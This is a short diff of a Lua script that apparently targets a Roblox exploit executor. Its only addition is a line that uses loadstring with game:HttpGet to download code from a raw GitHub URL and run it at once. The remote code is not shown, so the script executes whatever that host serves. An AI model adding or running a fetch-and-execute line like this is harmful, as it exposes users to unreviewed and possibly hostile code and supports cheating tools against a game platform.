@@ -46,3 +46,4 @@ if getgenv().gg_scripters == nil then
     )
 end
 getgenv().gg_scripters = "Aori0001"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/gugnon/hahahah/main/src", true))()
